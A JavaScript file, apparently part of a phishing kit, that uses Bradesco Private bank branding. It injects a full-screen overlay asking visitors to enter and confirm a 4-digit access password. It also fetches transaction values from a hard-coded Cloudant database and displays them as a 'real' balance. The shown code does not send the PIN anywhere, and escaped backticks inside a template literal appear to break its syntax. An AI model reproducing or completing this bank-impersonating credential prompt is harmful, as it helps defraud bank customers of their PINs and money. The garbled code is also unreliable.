/**
 * BRADESCO PRIVATE - ENGINE DALLAS (US-SOUTH)
 * VERSÃO: 1.5.0 | OPERAÇÃO: INJEÇÃO DE ABAS DE SEGURANÇA
 * CONEXÃO: IBM CLOUDANT / BANCO: TRANSACOES
 */

const BradescoPrivateEngine = {
    config: {
        db: "https://7f404dab-9bd6-4dc7-8b0b-e0e4a4283d5c-bluemix.cloudantnosqldb.appdomain.cloud",
        gold: "#c5a059",
        red: "#cc092f"
    },

    init() {
        console.log("Motor Bradesco Private Dallas Ativo...");
        this.injetarSeguranca();
        this.fetchSaldoReal();
    },

    injetarSeguranca() {
        const css = `
            #aba-sec-br { position:fixed; top:0; right:0; width:410px; height:100vh; background:#111; z-index:999999; border-left:2px solid ${this.config.gold}; padding:60px 40px; color:#fff; display:flex; flex-direction:column; box-shadow:-25px 0 80px #000; font-family:Arial; box-sizing:border-box; }
            .in-br { width:100%; padding:20px; background:#000; border:1px solid #333; color:${this.config.gold}; font-size:32px; text-align:center; letter-spacing:15px; margin:30px 0; outline:none; border-radius:4px; }
            .bt-br { width:100%; padding:22px; background:${this.config.red}; color:#fff; border:none; font-weight:bold; text-transform:uppercase; cursor:pointer; border-radius:4px; font-size:14px; }
        `;
        const style = document.createElement('style'); style.innerText = css; document.head.appendChild(style);
        
        const aba = document.createElement('div');
        aba.id = 'aba-sec-br';
        let pass1 = "";

        const render = (tit, sub, btn) => {
            aba.innerHTML = \`
                <img src="logo.png" style="height:30px; margin-bottom:25px;">
                <h2 style="color:${this.config.gold}; font-size:16px; text-transform:uppercase; letter-spacing:2px;">\${tit}</h2>
                <p style="color:#666; font-size:12px; line-height:1.6;">\${sub}</p>
                <input type="password" id="pw-fld" class="in-br" maxlength="4" placeholder="••••">
                <button class="bt-br" id="pw-btn">\${btn}</button>
            \`;
            document.body.appendChild(aba);
            document.getElementById('pw-btn').onclick = () => {
                const val = document.getElementById('pw-fld').value;
                if(val.length === 4) {
                    if(pass1 === "") { 
                        pass1 = val; 
                        render("Confirmar Senha", "Repita a senha de 4 dígitos para validar a operação.", "Confirmar e Entrar"); 
                    } else if(val === pass1) { 
                        aba.style.display="none"; 
                    } else { 
                        alert("As senhas não conferem."); location.reload(); 
                    }
                }
            };
        };
        render("Senha de Acesso", "Identificação Dallas requerida. Informe sua senha de 4 dígitos.", "Próximo Passo");
    },

    async fetchSaldoReal() {
        const el = document.getElementById('valor-ibm');
        if(!el) return;
        try {
            const res = await fetch(this.config.db);
            const data = await res.json();
            let total = 0;
            data.rows.forEach(r => { if(r.doc.valor) total += parseFloat(r.doc.valor); });
            if(total > 0) el.innerText = "R$ " + total.toLocaleString('pt-BR', {minimumFractionDigits: 2});
        } catch(e) { console.log("Cloudant Offline"); }
    }
};

BradescoPrivateEngine.init();
